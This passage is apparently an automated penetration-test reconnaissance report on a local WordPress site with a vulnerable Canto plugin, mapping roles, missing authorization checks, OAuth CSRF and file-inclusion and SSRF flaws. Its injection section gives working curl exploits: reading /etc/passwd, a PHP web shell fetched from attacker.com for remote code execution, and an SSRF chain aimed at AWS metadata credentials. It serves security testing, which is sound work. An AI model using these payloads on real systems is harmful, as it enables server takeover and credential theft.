|-----------|---------|-----------|--------|---------|
| Public Internet → WordPress Application | HTTPS | `:35995 /` | None | Public |
| Public Internet → WordPress Application | HTTPS | `:35995 /wp-login.php` | None | Public, Secrets (credentials in transit) |
| User Browser → WordPress Application | HTTP | `:35995 /wp-admin/*` | auth:user | PII, Tokens |
| User Browser → Canto Plugin Library Files | HTTP | `:35995 /wp-content/plugins/canto/includes/lib/*.php` | **NONE (CRITICAL)** | Tokens, Secrets, PII |
| WordPress Application → MySQL Database | TCP | `:3306` | localhost-only | PII, Tokens, Secrets |
| WordPress Application → Canto OAuth Service | HTTPS | `:443 /oauth/api/oauth2/authorize` | None (OAuth flow) | Public |
| Canto OAuth Service → WordPress Application | HTTPS | `:35995 /wp-admin/options-general.php?page=canto_settings` | auth:admin (callback) | Tokens (OAuth tokens in URL params) |
| WordPress Application → Canto DAM API | HTTPS | `:443 /api/v1/*` | Bearer Token | Public, Tokens |
| Canto Plugin Library Files → Canto DAM API | HTTPS | `:443 /api/v1/*` | **User-Controlled (SSRF)** | Public, Tokens, Internal Data (via SSRF) |
| Admin Browser → WordPress Admin Interface | HTTP | `:35995 /wp-admin/*` | auth:user + capability checks | PII, Secrets |
| Admin Browser → WordPress Application | HTTP | `:35995 /wp-admin/admin-ajax.php` | auth:user (weak for some actions) | PII, Tokens |
| WordPress Application → WordPress Application | Loopback | `wp-cron.php` (pseudo-cron) | None | Internal |

### 6.4 Guards Directory

| Guard Name | Category | Statement |
|------------|----------|-----------|
| **Authentication Guards** |
| auth:user | Auth | Requires a valid WordPress user session via wordpress_[hash] cookie. Checked via `auth_redirect()` or `is_user_logged_in()`. |
| auth:admin | Auth | Requires valid WordPress user session (same as auth:user). Note: "admin" in this context means "authenticated user", not "Administrator role". |
| nonce:required | Auth | Requires valid WordPress nonce token via `check_ajax_referer()` or `wp_verify_nonce()`. |
| **Authorization Guards** |
| role:subscriber | Authorization | Minimum Subscriber role required (Level 0). Capability: `read`. |
| role:contributor | Authorization | Minimum Contributor role required (Level 1). Capabilities: `read`, `edit_posts`, `delete_posts`. |
| role:author | Authorization | Minimum Author role required (Level 2). Adds: `publish_posts`, `upload_files`. |
| role:editor | Authorization | Minimum Editor role required (Level 7). Adds: `edit_others_posts`, `edit_published_posts`, `edit_pages`, `moderate_comments`. |
| role:administrator | Authorization | Administrator role required (Level 10). Capabilities: All capabilities including `manage_options`, `install_plugins`, `edit_users`, `delete_users`. |
| capability:edit_posts | Authorization | Requires specific capability to create/edit own posts. Checked via `current_user_can('edit_posts')`. |
| capability:edit_others_posts | Authorization | Requires capability to edit posts authored by other users. |
| capability:upload_files | Authorization | Requires capability to upload media files to WordPress library. |
| capability:manage_options | Authorization | Requires capability to manage WordPress site settings (admin-only). |
| capability:promote_users | Authorization | Requires capability to change user roles (admin-only). |
| **Object Ownership Guards** |
| ownership:post | ObjectOwnership | Verifies requesting user authored the target post. Uses `map_meta_cap()` to check post_author vs user_id. |
| ownership:comment | ObjectOwnership | Verifies requesting user authored the target comment. |
| **Network Guards** |
| localhost-only | Network | Restricts connections to localhost (127.0.0.1) only. Used for MySQL database binding. |
| **Context-Based Guards** |
| post_status:published | Authorization | Different capabilities required based on post status (publish, draft, private, trash). |
| password_protected:post | Authorization | Post password required via postpass cookie for password-protected content. |
| **OAuth Guards** |
| oauth:bearer_token | Auth | Requires valid OAuth Bearer token in Authorization header for Canto API requests. |
| oauth:state_validation | Auth | **MISSING (CRITICAL)** - OAuth state parameter should be validated to prevent CSRF, but is not implemented. |

## 7. Role & Privilege Architecture

### 7.1 Discovered Roles

| Role Name | Privilege Level | Scope/Domain | Code Implementation |
|-----------|----------------|--------------|---------------------|
| Anonymous/Unauthenticated | 0 | Global | No session required. Can access public pages, login form, password reset. |
| Subscriber | 1 | Global | Capability: `read`. Can read posts/pages, manage own profile. Defined in `/app/html/wp-admin/includes/schema.php` line 750. |
| Contributor | 2 | Global | Capabilities: `read`, `edit_posts`, `delete_posts`. Can create/edit own posts (not publish). Defined in schema.php line 764. |
| Author | 3 | Global | Adds: `publish_posts`, `upload_files`, `edit_published_posts`, `delete_published_posts`. Can publish own content. Defined in schema.php line 779. |
| Editor | 7 | Global | Adds: `edit_others_posts`, `edit_pages`, `edit_published_pages`, `publish_pages`, `moderate_comments`, `manage_categories`. Cannot install plugins or manage users. Defined in schema.php line 801. |
| Administrator | 10 | Global | All capabilities including: `manage_options`, `install_plugins`, `activate_plugins`, `edit_plugins`, `install_themes`, `switch_themes`, `edit_themes`, `edit_users`, `create_users`, `delete_users`, `unfiltered_html`, `unfiltered_upload`. Full site control. Defined in schema.php line 876. |

**Role Storage:** `wp_options` table, option_name='wp_user_roles' (serialized PHP array)

**User-to-Role Mapping:** `wp_usermeta` table, meta_key='wp_capabilities' (serialized PHP array)

### 7.2 Privilege Lattice

```
Privilege Ordering (→ means "can access resources of"):
Anonymous → Subscriber → Contributor → Author → Editor → Administrator

Capability Inheritance:
Administrator ⊇ Editor ⊇ Author ⊇ Contributor ⊇ Subscriber ⊇ Anonymous

Parallel Isolation:
- None in default WordPress (no multi-tenancy in single-site mode)
- All roles exist in a single global hierarchy
- No department-level or team-level role isolation

Impersonation/Role Switching:
- NOT IMPLEMENTED in WordPress core
- No admin impersonation features found
- No temporary privilege elevation (no sudo mode)
- Admins can change user roles but cannot "act as" another user without plugins
```

**Capability Dominance Examples:**
- `Administrator` has `edit_others_posts` → can edit all posts (including Authors' and Editors')
- `Editor` has `edit_others_posts` → can edit Contributor and Author posts
- `Author` has `edit_posts` but NOT `edit_others_posts` → can only edit own posts
- `Contributor` has `edit_posts` but NOT `publish_posts` → can create drafts, cannot publish

### 7.3 Role Entry Points

| Role | Default Landing Page | Accessible Route Patterns | Authentication Method |
|------|---------------------|--------------------------|----------------------|
| Anonymous | `/` (homepage) | `/`, `/wp-login.php`, `/wp-login.php?action=lostpassword`, `/xmlrpc.php`, `/wp-comments-post.php`, `/wp-content/plugins/canto/includes/lib/*.php` (CRITICAL) | None |
| Subscriber | `/wp-admin/` (dashboard) | All Anonymous routes + `/wp-admin/profile.php`, `/wp-admin/index.php` | Session cookie (wordpress_[hash]) |
| Contributor | `/wp-admin/edit.php` (posts list) | All Subscriber routes + `/wp-admin/post-new.php`, `/wp-admin/post.php?action=edit` (own posts) | Session cookie |
| Author | `/wp-admin/edit.php` | All Contributor routes + `/wp-admin/upload.php` (media library), publish button on own posts | Session cookie |
| Editor | `/wp-admin/` | All Author routes + `/wp-admin/edit.php` (all posts), `/wp-admin/edit-comments.php`, `/wp-admin/edit-tags.php`, pages management | Session cookie |
| Administrator | `/wp-admin/` | ALL routes including `/wp-admin/plugins.php`, `/wp-admin/themes.php`, `/wp-admin/users.php`, `/wp-admin/options-general.php`, `/wp-admin/plugin-editor.php`, `/wp-admin/theme-editor.php` | Session cookie |

**Canto Plugin Access:**
- **Settings Page:** `/wp-admin/options-general.php?page=canto_settings` - Requires `manage_options` capability (Administrator only)
- **Media Browser:** `/wp-admin/media-upload.php?type=canto` - Requires `upload_files` capability (Author, Editor, Administrator)
- **Library Files:** `/wp-content/plugins/canto/includes/lib/*.php` - **NO AUTHENTICATION REQUIRED (CRITICAL VULNERABILITY)**

### 7.4 Role-to-Code Mapping

| Role | Middleware/Guards | Permission Checks | Storage Location |
|------|------------------|-------------------|------------------|
| Anonymous | None | `!is_user_logged_in()` | No storage |
| Subscriber | `auth_redirect()` at `/wp-admin/admin.php:99` | `current_user_can('read')` | `wp_usermeta`.`meta_value` where `meta_key='wp_capabilities'` → `a:1:{s:10:"subscriber";b:1;}` |
| Contributor | `auth_redirect()` | `current_user_can('edit_posts')` | `wp_usermeta` → `a:1:{s:11:"contributor";b:1;}` |
| Author | `auth_redirect()` | `current_user_can('publish_posts')`, `current_user_can('upload_files')` | `wp_usermeta` → `a:1:{s:6:"author";b:1;}` |
| Editor | `auth_redirect()` | `current_user_can('edit_others_posts')`, `current_user_can('moderate_comments')` | `wp_usermeta` → `a:1:{s:6:"editor";b:1;}` |
| Administrator | `auth_redirect()` | `current_user_can('manage_options')`, `current_user_can('install_plugins')`, etc. | `wp_usermeta` → `a:1:{s:13:"administrator";b:1;}` |

**Capability Check Implementation:**
- **Primary Function:** `current_user_can($capability)` at `/app/html/wp-includes/capabilities.php`
- **Mapping Function:** `map_meta_cap($meta_cap, $user_id, ...$args)` at `/app/html/wp-includes/capabilities.php:44-1048`
- **User Capability Loading:** `WP_User::get_role_caps()` at `/app/html/wp-includes/class-wp-user.php:506-527`
- **Admin Redirect:** `auth_redirect()` at `/app/html/wp-admin/admin.php:99`

**Canto Plugin Authorization Issues:**
- **File:** `/app/html/wp-content/plugins/canto/includes/class-canto.php`
  - Line 210: `add_action('wp_ajax_fbc_get_token', ...)` - **MISSING CAPABILITY CHECK** (should require manage_options)
  - Line 214: `add_action('wp_ajax_updateOptions', ...)` - **MISSING CAPABILITY CHECK** (should require manage_options)
- **File:** `/app/html/wp-content/plugins/canto/includes/lib/*.php`
  - **ALL 6 FILES** - **NO AUTHENTICATION CHECKS** (bypass WordPress entirely via direct file access)

## 8. Authorization Vulnerability Candidates

### 8.1 Horizontal Privilege Escalation Candidates

Ranked list of endpoints with object identifiers that could allow access to other users' resources.

| Priority | Endpoint Pattern | Object ID Parameter | Data Type | Sensitivity | Authorization Check | Vulnerability Notes |
|----------|-----------------|---------------------|-----------|-------------|---------------------|---------------------|
| **CRITICAL** | `/wp-content/plugins/canto/includes/lib/get.php` | album, keyword | canto_media | High | **NONE** | Unauthenticated access to any Canto album/media. IDOR + Authentication Bypass. |
| **CRITICAL** | `/wp-content/plugins/canto/includes/lib/download.php` | id | canto_media | High | **NONE** | Unauthenticated download of any Canto media by ID. IDOR + Authentication Bypass. |
| **CRITICAL** | `/wp-content/plugins/canto/includes/lib/detail.php` | id, scheme | canto_media | High | **NONE** | Unauthenticated access to any Canto media details. IDOR + Authentication Bypass. |
| **CRITICAL** | `/wp-content/plugins/canto/includes/lib/tree.php` | ablumid | canto_albums | Medium | **NONE** | Unauthenticated enumeration of Canto folder structure. IDOR + Authentication Bypass. |
| High | `/wp-content/plugins/canto/includes/lib/copy-media.php` | fbc_id, post_id | canto_media, wp_posts | High | upload_files (weak) | Users with upload_files can copy ANY Canto media to ANY post_id without ownership validation. IDOR for both Canto media and WordPress posts. |
| High | `/wp-content/plugins/canto/includes/lib/media-upload.php` | blog_id | wp_blogs (multisite) | High | upload_files | Users can specify arbitrary blog_id to upload media to blogs they don't own (multisite IDOR). Line 14: `$get_blog_id = sanitize_text_field($_GET["blog_id"]);` |
| Medium | `/wp-admin/admin-ajax.php?action=fbc_getMetadata` | fbc_id | canto_media | Medium | nonce check only | Any authenticated user can fetch metadata for any Canto media ID. No ownership validation. |
| Low | `/wp-admin/post.php?action=edit` | post | wp_posts | High | `edit_post` capability | WordPress properly validates with `map_meta_cap()` - users can only edit posts they own or have edit_others_posts capability. NOT VULNERABLE. |
| Low | `/wp-admin/profile.php` | user_id | wp_users | PII | `edit_user` capability | WordPress properly validates user can edit specified user. NOT VULNERABLE. |

**Testing Strategy:**
1. Test Canto library files without authentication (anonymous requests)
2. Test with low-privilege user (Subscriber) attempting to access Contributor/Author/Admin Canto media
3. Test copy-media.php with post_id values the user doesn't own
4. Test media-upload.php with blog_id values (if multisite were enabled)

### 8.2 Vertical Privilege Escalation Candidates

List of endpoints requiring higher privileges, organized by target role.

#### 8.2.1 Subscriber → Contributor (Publish Content)

| Target Endpoint | Functionality | Required Capability | Current Check | Risk Level |
|----------------|---------------|---------------------|---------------|------------|
| `/wp-admin/post-new.php` | Create new post | edit_posts | Proper check | Low (protected) |
| `/wp-admin/post.php?action=edit` | Edit existing post | edit_posts | Proper check | Low (protected) |

**Note:** WordPress properly prevents Subscribers from creating/editing posts. No vertical escalation found.

#### 8.2.2 Contributor → Author (Publish & Upload)

| Target Endpoint | Functionality | Required Capability | Current Check | Risk Level |
|----------------|---------------|---------------------|---------------|------------|
| `/wp-admin/upload.php` | Access media library | upload_files | Proper check | Low (protected) |
| `/wp-admin/async-upload.php` | Upload files | upload_files | Proper check | Low (protected) |
| Publish button on post editor | Publish post | publish_posts | Proper check | Low (protected) |

**Note:** WordPress properly restricts file uploads and publishing to Author+ roles. No vertical escalation found.

#### 8.2.3 Author → Editor (Edit Others' Content)

| Target Endpoint | Functionality | Required Capability | Current Check | Risk Level |
|----------------|---------------|---------------------|---------------|------------|
| `/wp-admin/edit.php` (others' posts) | View others' posts | edit_others_posts | Proper check | Low (protected) |
| `/wp-admin/post.php?action=edit&post={id}` | Edit others' posts | edit_others_posts | Proper check via `map_meta_cap()` | Low (protected) |
| `/wp-admin/edit-comments.php` | Moderate comments | moderate_comments | Proper check | Low (protected) |

**Note:** WordPress properly prevents Authors from editing others' content. No vertical escalation found.

#### 8.2.4 Editor → Administrator (System Configuration)

| Target Endpoint | Functionality | Required Capability | Current Check | Risk Level |
|----------------|---------------|---------------------|---------------|------------|
| `/wp-admin/plugins.php` | Manage plugins | activate_plugins | Proper check | Low (protected) |
| `/wp-admin/themes.php` | Manage themes | switch_themes | Proper check | Low (protected) |
| `/wp-admin/users.php` | Manage users | list_users | Proper check | Low (protected) |
| `/wp-admin/options-general.php` | Site settings | manage_options | Proper check | Low (protected) |
| `/wp-admin/plugin-editor.php` | Edit plugin code | edit_plugins | Proper check | Low (protected) |
| `/wp-admin/theme-editor.php` | Edit theme code | edit_themes | Proper check | Low (protected) |

**Note:** WordPress properly restricts administrative functions to Administrator role only. No vertical escalation found in core.

#### 8.2.5 Any Authenticated User → Administrator (Canto Plugin Vulnerabilities)

| Target Endpoint | Functionality | Required Capability | Actual Check | Risk Level |
|----------------|---------------|---------------------|--------------|------------|
| `/wp-admin/admin-ajax.php?action=updateOptions` | Modify Canto plugin settings | **manage_options** | **MISSING** | **HIGH** |
| `/wp-admin/admin-ajax.php?action=fbc_updateOptions` | Modify Canto plugin settings | **manage_options** | **MISSING** | **HIGH** |
| `/wp-admin/admin-ajax.php?action=fbc_get_token` | Obtain OAuth tokens | **manage_options** | **MISSING** | **HIGH** |
| `/wp-admin/options-general.php?page=canto_settings` | Access Canto settings UI | manage_options | Proper check | Low (protected) |

**Exploitation Scenario:**
1. Attacker authenticates as Subscriber (lowest privilege)
2. Sends POST to `/wp-admin/admin-ajax.php?action=updateOptions`
3. Modifies plugin settings (cron schedule, duplicate detection)
4. No capability check prevents this (only `wp_ajax_` hook checks if user is logged in)

**Code References:**
- `/app/html/wp-content/plugins/canto/includes/class-canto.php:478-515` - updateOptions() has no `current_user_can('manage_options')` check
- `/app/html/wp-content/plugins/canto/includes/class-canto.php:386-428` - getToken() has no capability check

### 8.3 Context-Based Authorization Candidates

Multi-step workflow endpoints that assume prior steps were completed.

| Workflow | Endpoint | Expected Prior State | Bypass Potential | Risk Level |
|----------|----------|---------------------|------------------|------------|
| Password Reset | `/wp-login.php?action=resetpass` | Valid reset key + username | Reset key validation required (cannot bypass) | Low |
| OAuth Callback | `/wp-admin/options-general.php?page=canto_settings` with token/domain params | OAuth authorization initiated with state param | **State parameter NOT VALIDATED (OAuth CSRF)** | **HIGH** |
| Post Password Protection | `/wp-login.php?action=postpass` | User knows post password | Post password cookie checked (cannot bypass without knowing password) | Low |
| Media Upload to Post | `/wp-content/plugins/canto/includes/lib/copy-media.php` | User should own target post | **NO OWNERSHIP VALIDATION** - can upload to any post_id | **HIGH** |
| Comment Submission | `/wp-comments-post.php` | Valid post_id, comments enabled | WordPress validates post exists and allows comments | Low |

**High-Risk Context Vulnerabilities:**

#### 8.3.1 OAuth CSRF Attack (Canto Plugin)

**Workflow:** Canto OAuth integration
- Step 1: Admin initiates OAuth at `/wp-admin/options-general.php?page=canto_settings` → clicks "Connect to Canto"
- Step 2: Redirects to `https://oauth.canto.com/oauth/api/oauth2/authorize` with state parameter
- Step 3: User authorizes at Canto
- Step 4: Callback to `/wp-admin/options-general.php?page=canto_settings` with token, domain, refreshToken, app_api params
- **MISSING:** State parameter validation at callback (line 482-513 in class-canto-settings.php)

**Attack Scenario:**
1. Attacker initiates OAuth flow, obtains authorization code
2. Attacker tricks victim admin to visit callback URL with attacker's code
3. Victim's WordPress site is now linked to attacker's Canto account
4. Attacker can exfiltrate media via attacker-controlled Canto account

**Code Reference:**
- State generation: `/app/html/wp-content/plugins/canto/includes/class-canto-settings.php:276`
- Callback (NO VALIDATION): `/app/html/wp-content/plugins/canto/includes/class-canto-settings.php:482-513`

#### 8.3.2 Cross-Post Media Upload (Canto Plugin)

**Workflow:** Copy media from Canto to WordPress post
- Step 1: User browses Canto media library
- Step 2: Selects media item
- Step 3: POST to `/wp-content/plugins/canto/includes/lib/copy-media.php` with fbc_id and post_id
- **MISSING:** Validation that user owns or can edit target post_id

**Attack Scenario:**
1. Author user authenticates
2. Discovers post_id of admin-authored post (e.g., post_id=1)
3. Sends POST to copy-media.php with fbc_id=malicious_media&post_id=1
4. Media uploaded to admin post without authorization check

**Code Reference:**
- `/app/html/wp-content/plugins/canto/includes/lib/copy-media.php:69` - post_id accepted
- `/app/html/wp-content/plugins/canto/includes/lib/copy-media.php:203` - media_handle_sideload() called without ownership validation

## 9. Injection Sources (Command Injection and SQL Injection)

**TASK AGENT COORDINATION:** Dedicated Injection Source Tracer Agent analyzed the complete codebase.

**Network Surface Focus:** Only injection sources reachable through the target web application's network interface.

### Summary of Findings

**Command Injection Sources:** **NONE FOUND**
- No user-controlled input reaches `exec()`, `shell_exec()`, `system()`, `passthru()`, `popen()`, or `proc_open()`
- PHPMailer in WordPress core uses hardcoded sendmail paths with no user input
- Canto plugin makes only HTTP requests (no shell commands)

**SQL Injection Sources:** **NONE FOUND**
- WordPress core uses prepared statements (`$wpdb->prepare()`) throughout
- All database queries properly parameterized with `%s`, `%d`, `%f` placeholders
- Canto plugin makes NO database queries (only HTTP API calls to Canto)

**Related Vulnerabilities Found:** **LOCAL FILE INCLUSION (LFI) → REMOTE CODE EXECUTION (RCE)**

### 9.1 Local File Inclusion (LFI) Vulnerabilities - CRITICAL

The Canto plugin contains **6 critical Local File Inclusion vulnerabilities** that bypass authentication and can lead to Remote Code Execution due to `allow_url_include=On` PHP configuration.

#### LFI Source #1: get.php

**Vulnerability Type:** Local File Inclusion (LFI) → Remote File Inclusion (RFI) → Remote Code Execution (RCE)

**Entry Point:** `GET/POST /wp-content/plugins/canto/includes/lib/get.php`

**Input Parameter:** `wp_abspath` (via `$_REQUEST`)

**File Path:** `/app/html/wp-content/plugins/canto/includes/lib/get.php`

**Line Number:** 5

**Dangerous Code:**
```php
require_once($_REQUEST['wp_abspath'] . '/wp-admin/admin.php');
```

**Complete Data Flow:**
1. HTTP Request → `$_REQUEST['wp_abspath']` (NO authentication required)
2. Line 5 → `require_once($_REQUEST['wp_abspath'] . '/wp-admin/admin.php')`
3. PHP includes attacker-controlled file path
4. With `allow_url_include=On`, can include remote files
5. Remote PHP code executes → **Remote Code Execution**

**Exploitability:** **CRITICAL - IMMEDIATE RCE POSSIBLE**

**Proof of Concept:**
```bash
# Local File Inclusion to read /etc/passwd
curl "http://localhost:35995/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/../../../../etc/passwd%00"

# Remote File Inclusion to achieve RCE (allow_url_include=On confirmed)
# Step 1: Host malicious PHP on attacker server
echo '<?php system($_GET["cmd"]); ?>' > /var/www/shell.txt

# Step 2: Execute via RFI
curl "http://localhost:35995/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.txt?&cmd=id"
```

**Why This Works:**
- No authentication check before `require_once()`
- `allow_url_include=On` enabled in `/etc/php/7.4/apache2/php.ini` (confirmed in Dockerfile lines 39-40)
- No path validation on `wp_abspath` parameter
- `sanitize_text_field()` does NOT prevent path traversal or URL inclusion

#### LFI Source #2: download.php

**File Path:** `/app/html/wp-content/plugins/canto/includes/lib/download.php`
**Line Number:** 5
**Dangerous Code:** `require_once($_REQUEST['wp_abspath'] . '/wp-admin/admin.php')`
**Entry Point:** `GET/POST /wp-content/plugins/canto/includes/lib/download.php?wp_abspath=[PAYLOAD]`
**Exploitability:** **CRITICAL** - Same RFI/RCE path as get.php

#### LFI Source #3: detail.php

**File Path:** `/app/html/wp-content/plugins/canto/includes/lib/detail.php`
**Line Number:** 3
**Dangerous Code:** `require_once($_REQUEST['wp_abspath'] . '/wp-admin/admin.php')`
**Entry Point:** `GET/POST /wp-content/plugins/canto/includes/lib/detail.php?wp_abspath=[PAYLOAD]`
**Exploitability:** **CRITICAL** - Same RFI/RCE path

#### LFI Source #4: tree.php

**File Path:** `/app/html/wp-content/plugins/canto/includes/lib/tree.php`
**Line Number:** 5
**Dangerous Code:** `require_once($_REQUEST['wp_abspath'] . '/wp-admin/admin.php')`
**Entry Point:** `GET/POST /wp-content/plugins/canto/includes/lib/tree.php?wp_abspath=[PAYLOAD]`
**Exploitability:** **CRITICAL** - Same RFI/RCE path

#### LFI Source #5: sizes.php (DUAL INJECTION POINTS)

**File Path:** `/app/html/wp-content/plugins/canto/includes/lib/sizes.php`

**Injection Point #1:**
- **Line 15:** `require_once(urldecode($_REQUEST["abspath"]) . 'wp-admin/admin.php')`
- Uses `urldecode()` allowing **double-encoding attacks**

**Injection Point #2:**
- **Line 18:** `require_once($_REQUEST["abspath"] . 'wp-admin/includes/image.php')`
- Direct inclusion without urldecode

**Entry Point:** `GET/POST /wp-content/plugins/canto/includes/lib/sizes.php?abspath=[PAYLOAD]`

**Exploitability:** **CRITICAL** - Additional attack surface via double-encoding:
```bash
# Double URL-encoded path traversal
curl "http://localhost:35995/wp-content/plugins/canto/includes/lib/sizes.php?abspath=%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd%2500"
```

#### LFI Source #6: copy-media.php (DUAL INJECTION POINTS)

**File Path:** `/app/html/wp-content/plugins/canto/includes/lib/copy-media.php`

**Injection Point #1:**
- **Line 55:** `require_once(urldecode($_POST['abspath']) . 'wp-admin/admin.php')`
- Uses `urldecode()` and `$_POST` instead of `$_REQUEST`

**Injection Point #2:**
- **Line 58:** `require_once($_POST['abspath'] . 'wp-admin/includes/file.php')`
- Direct inclusion without urldecode

**Entry Point:** `POST /wp-content/plugins/canto/includes/lib/copy-media.php` with `abspath=[PAYLOAD]` in POST body

**Exploitability:** **CRITICAL** - POST-based exploitation:
```bash
# POST-based RFI
curl -X POST "http://localhost:35995/wp-content/plugins/canto/includes/lib/copy-media.php" \
  -d "abspath=http://attacker.com/shell.txt?"
```

### 9.2 Server-Side Request Forgery (SSRF) Vulnerabilities - HIGH SEVERITY

All six vulnerable files also construct URLs using user-supplied parameters for API requests, enabling SSRF attacks.

#### SSRF Source #1: get.php

**File Path:** `/app/html/wp-content/plugins/canto/includes/lib/get.php`
**Lines:** 31-43
**User-Controllable Parameters:** `subdomain`, `app_api`, `album`, `keyword`

**Dangerous Code:**
```php
$subdomain = sanitize_text_field($_REQUEST['subdomain']);
$app_api = sanitize_text_field($_REQUEST['app_api']);
$url = 'https://' . $subdomain . '.' . $app_api . '/api/v1/search?...';
$response = wp_remote_get($url, ...);
```

**Attack Scenarios:**
1. **AWS Metadata Access:** `subdomain=169.254.169&app_api=254/latest/meta-data/iam/security-credentials/`
2. **Internal Network Scanning:** `subdomain=192.168.1&app_api=1:8080`
3. **Kubernetes API:** `subdomain=kubernetes&app_api=default.svc.cluster.local/api/v1/namespaces`

#### SSRF Source #2: download.php

**File Path:** `/app/html/wp-content/plugins/canto/includes/lib/download.php`
**Line:** 15
**URL Construction:** `https://{subdomain}.{app_api}/api_binary/v1/advance/image/{id}/download/directuri`

#### SSRF Source #3: detail.php

**File Path:** `/app/html/wp-content/plugins/canto/includes/lib/detail.php`
**Line:** 13
**URL Construction:** `https://{subdomain}.{app_api}/api/v1/{scheme}/{id}`

#### SSRF Source #4: tree.php

**File Path:** `/app/html/wp-content/plugins/canto/includes/lib/tree.php`
**Lines:** 15-17
**URL Construction:** `https://{subdomain}.{app_api}/api/v1/tree/{ablumid}` or `/api/v1/tree`

#### SSRF Source #5: copy-media.php (CHAINED SSRF)

**File Path:** `/app/html/wp-content/plugins/canto/includes/lib/copy-media.php`
**Lines:** 86-111

**Multi-stage SSRF Chain:**
1. Line 86: First request to `https://{fbc_flight_domain}.{fbc_app_api}/api/v1/{fbc_scheme}/{fbc_id}`
2. Line 105: Second request to `{response->url->download}/directuri`
3. Line 111: Third request via `download_url($location)` to download file
4. Line 203: Uploaded to WordPress media library (publicly accessible)

**Attack Chain:**
```bash
# Step 1: POST to copy-media.php with attacker-controlled domains
curl -X POST "http://localhost:35995/wp-content/plugins/canto/includes/lib/copy-media.php" \
  -d "fbc_flight_domain=169.254.169" \
  -d "fbc_app_api=254/latest/meta-data" \
  -d "fbc_scheme=iam" \
  -d "fbc_id=security-credentials" \
  -d "abspath=/var/www/html/"

# Step 2: Attacker-controlled "API" returns:
{"url": {"download": "http://169.254.169.254/latest/user-data"}}

# Step 3: Server downloads AWS user-data
# Step 4: File uploaded to WordPress media library
# Step 5: Attacker accesses /wp-content/uploads/[year]/[month]/[filename] to exfiltrate data
```

### 9.3 Consolidated Vulnerability Table

| # | Vulnerability Type | File | Line | Entry Point | Parameter | Severity |
|---|-------------------|------|------|-------------|-----------|----------|
| 1 | LFI→RFI→RCE | get.php | 5 | GET/POST | wp_abspath | CRITICAL |
| 2 | LFI→RFI→RCE | download.php | 5 | GET/POST | wp_abspath | CRITICAL |
| 3 | LFI→RFI→RCE | detail.php | 3 | GET/POST | wp_abspath | CRITICAL |
| 4 | LFI→RFI→RCE | tree.php | 5 | GET/POST | wp_abspath | CRITICAL |
| 5a | LFI→RFI→RCE | sizes.php | 15 | GET/POST | abspath (urldecoded) | CRITICAL |
| 5b | LFI→RFI→RCE | sizes.php | 18 | GET/POST | abspath | CRITICAL |
| 6a | LFI→RFI→RCE | copy-media.php | 55 | POST | abspath (urldecoded) | CRITICAL |
| 6b | LFI→RFI→RCE | copy-media.php | 58 | POST | abspath | CRITICAL |
| 7 | SSRF | get.php | 31-43 | GET/POST | subdomain, app_api | HIGH |
| 8 | SSRF | download.php | 15 | GET/POST | subdomain, app_api | HIGH |
| 9 | SSRF | detail.php | 13 | GET/POST | subdomain, app_api | HIGH |
| 10 | SSRF | tree.php | 15-17 | GET/POST | subdomain, app_api | HIGH |
| 11 | SSRF (Chained) | copy-media.php | 86-111 | POST | fbc_flight_domain, fbc_app_api | HIGH |

### 9.4 Why Traditional Command/SQL Injection Wasn't Found

**Command Injection:**
- WordPress core does NOT execute shell commands with user input
- PHPMailer uses hardcoded sendmail paths from configuration
- No file upload processing with shell commands (e.g., ImageMagick)
- No shell command execution found in Canto plugin

**SQL Injection:**
- WordPress `$wpdb` class enforces prepared statements throughout
- All queries use `$wpdb->prepare("SELECT ... WHERE column = %s", $user_input)`
- File: `/app/html/wp-includes/class-wpdb.php` lines 1353-1582 (prepare method)
- Canto plugin makes ZERO database queries (only HTTP API calls)
- No raw SQL concatenation found in network-accessible code paths

**Assessment:** WordPress follows secure coding practices for SQL and command execution. The critical vulnerabilities are in file inclusion and SSRF, not traditional injection types.

---

**RECONNAISSANCE COMPLETE**

This comprehensive reconnaissance deliverable provides the foundational intelligence required for all subsequent vulnerability analysis specialists. All endpoints, authorization patterns, input vectors, and injection sources have been mapped with exact file paths and line numbers for verification and exploitation.